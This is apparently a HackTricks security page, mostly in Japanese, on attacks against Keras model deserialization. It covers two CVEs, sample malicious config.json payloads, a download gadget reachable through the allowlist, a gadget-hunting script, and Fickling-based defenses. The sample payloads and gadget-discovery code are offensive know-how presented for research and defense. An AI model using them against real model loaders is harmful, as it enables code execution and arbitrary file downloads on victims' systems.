# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

このページは、Keras のモデルデシリアライズパイプラインに対する実用的なエクスプロイト手法を要約し、ネイティブな .keras フォーマットの内部構造と攻撃対象領域を説明し、Model File Vulnerabilities (MFVs) や post-fix gadgets を発見するための研究者向けツールキットを提供します。

## .keras model format internals

.keras ファイルは少なくとも以下を含む ZIP アーカイブです:
- metadata.json – 一般的な情報（例: Keras version）
- config.json – モデルのアーキテクチャ（primary attack surface）
- model.weights.h5 – 重み（HDF5）

config.json は再帰的なデシリアライズを促します: Keras はモジュールをインポートし、クラス/関数を解決し、攻撃者が制御する辞書からレイヤーやオブジェクトを再構築します。

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
デシリアライズは以下を実行する:
- Module import and symbol resolution from module/class_name keys
- from_config(...) or constructor invocation with attacker-controlled kwargs
- Recursion into nested objects (activations, initializers, constraints, etc.)

Historically, this exposed three primitives to an attacker crafting config.json:
- Control of what modules are imported
- Control of which classes/functions are resolved
- Control of kwargs passed into constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Kerasはデフォルトで safe_mode=True を強制します。Lambda 内のシリアライズされた Python 関数は、ユーザーが明示的に safe_mode=False を選択しない限りブロックされます。

Notes:
- 古い形式（旧式の HDF5 保存）や古いコードベースでは最新のチェックが適用されていない場合があり、古いローダーを使用する被害者に対しては「ダウングレード」型の攻撃が依然として成立し得ます。

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn は、config.json からの攻撃者制御のモジュール文字列を用いて、制限なしに importlib.import_module() を呼び出していました。
- Impact: インストール済みの任意のモジュール（または sys.path 上に攻撃者が設置したモジュール）の任意インポートが可能になります。インポート時にコードが実行され、その後オブジェクト構築が攻撃者指定の kwargs で行われます。

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
セキュリティの改善 (Keras ≥ 3.9):
- モジュール許可リスト: インポートが公式エコシステムモジュールに制限されます: keras, keras_hub, keras_cv, keras_nlp
- セーフモードをデフォルトに設定: safe_mode=True により安全でない Lambda のシリアライズ済み関数の読み込みをブロックします
- 基本的な型チェック: デシリアライズされたオブジェクトは期待される型と一致する必要があります

## allowlist 内のポストフィックスガジェットの攻撃面

許可リスト化とセーフモードが有効でも、許可された Keras の呼び出し可能オブジェクト群には依然として広範なサーフェスが残っています。例えば、keras.utils.get_file は任意の URL をユーザーが選択可能な場所にダウンロードできます。

許可された関数を参照する Lambda 経由の Gadget（シリアライズされた Python バイトコードではない）:
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要な制限：
- Lambda.call() は入力テンソルをターゲットの呼び出し可能オブジェクトに渡す際、最初の位置引数として先頭に付けます。選択した gadgets は余分な位置引数を許容するか（または *args/**kwargs を受け入れる）必要があります。これにより利用可能な関数が制約されます。

Potential impacts of allowlisted gadgets:
- 任意のダウンロード/書き込み（path planting、config poisoning）
- 環境に依存したネットワークコールバック/SSRF のような影響
- 書き込まれたパスが後で import/実行される、または PYTHONPATH に追加される、あるいは書き込み時に実行される書き込み可能な場所が存在する場合、コード実行に連鎖する可能性

## Researcher toolkit

1) Systematic gadget discovery in allowed modules

Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) 直接デシリアライズのテスト（.kerasアーカイブ不要）

作成したdictsをKeras deserializersに直接与えて、受け入れられるparamsを把握し、副作用を観察する。
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) クロスバージョンのプロービングとフォーマット

Keras は、異なるガードレールとフォーマットを持つ複数のコードベース／時代に存在します:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

コードベースやフォーマット（.keras vs レガシー HDF5）を跨いでテストを繰り返し、回帰や保護の欠如を発見してください。

## Defensive recommendations

- モデルファイルを信頼できない入力として扱う。信頼できるソースからのモデルのみをロードする。
- Keras を最新に保つ。allowlisting と型チェックの恩恵を得るために Keras ≥ 3.9 を使用する。
- ファイルを完全に信頼している場合を除き、モデルをロードする際に safe_mode=False を設定しない。
- デシリアライズは、ネットワーク出口なし、ファイルシステムアクセス制限付きのサンドボックス化された最小権限環境で行うことを検討する。
- 可能な限り、モデルソースの allowlists／署名や整合性チェックを強制する。

## ML pickle import allowlisting for AI/ML models (Fickling)

多くの AI/ML モデルフォーマット（PyTorch .pt/.pth/.ckpt、joblib/scikit-learn、古い TensorFlow アーティファクト等）は Python の pickle データを埋め込んでいます。攻撃者は pickle の GLOBAL インポートやオブジェクトコンストラクタを悪用して、ロード中に RCE やモデルの置換を引き起こすことが常習的にあります。ブラックリストベースのスキャナは、未知またはリスト外の危険なインポートを見逃すことが多いです。

実用的な fail-closed な防御は、Python の pickle デシリアライザをフックし、unpickling 中にレビュー済みの無害な ML 関連インポートのみを許可することです。Trail of Bits の Fickling はこの方針を実装しており、数千の公開 Hugging Face pickle から作成されたキュレーション済みの ML インポート allowlist を提供します。

Security model for “safe” imports (intuitions distilled from research and practice): imported symbols used by a pickle must simultaneously:
- コードを実行したり実行を引き起こしたりしない（コンパイル済み/ソースコードオブジェクト、外部プロセス起動、フック等を含まない）
- 任意の属性や要素を取得／設定しない
- pickle VM から他の Python オブジェクトをインポートしたり参照を取得したりしない
- 二次デシリアライザ（例えば marshal、ネストした pickle）を間接的であってもトリガーしない

プロセス起動時に可能な限り早く Fickling の保護を有効化し、フレームワーク（torch.load、joblib.load 等）が行うすべての pickle ロードが検査されるようにする:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
運用上のヒント:
- 必要に応じてhooksを一時的に無効化/再有効化できます:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 既知の安全なモデルがブロックされている場合は、シンボルを確認したうえで環境の allowlist を拡張してください:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling は、より細かい制御を望む場合に使える一般的なランタイムガードも提供します:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- 可能な限り非-pickle のモデルフォーマット（例: SafeTensors）を優先してください。pickle を受け入れざるを得ない場合は、ネットワークの外向け通信を禁止した最小権限でローダを実行し、allowlist を適用してください。

この allowlist-first 戦略は、互換性を高く保ちながら一般的な ML pickle 悪用経路を確実にブロックすることが示されています。ToB のベンチマークでは、Fickling が合成の悪意あるファイルを 100% 検出し、トップの Hugging Face リポジトリからのクリーンなファイルのおよそ 99% を許可しました。

## 参考文献

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
